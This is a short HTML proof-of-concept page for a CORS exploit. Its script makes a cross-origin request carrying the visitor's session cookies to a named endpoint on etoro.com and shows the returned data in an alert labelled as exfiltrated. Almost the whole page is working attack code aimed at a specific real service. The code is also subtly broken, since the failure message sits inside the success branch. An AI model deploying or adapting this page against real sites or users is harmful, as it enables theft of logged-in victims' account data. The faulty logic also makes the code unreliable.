<body>
    <h2>CORS Exploit Proof of Concept</h2>
    <p>Attempting to read data from the target site...</p>
    
    <script>
        // Replace with the vulnerable API endpoint of the target
        var targetUrl = "https://www.etoro.com/api/logininfo/v1.1/aggregatedInfo?cidList";

        const xhr = new XMLHttpRequest();
        xhr.open("GET", targetUrl, true);
        
        // This sends the victim's session cookies along with the request
        xhr.withCredentials = true; 

        xhr.onload = function () {
            if (xhr.status === 200) {
                // If successful, the sensitive data is leaked here
                alert("Data Exfiltrated Successfully:\n\n" + xhr.responseText);

                alert("Failed to fetch data. Status: " + xhr.status);
            }
        };

    </script>
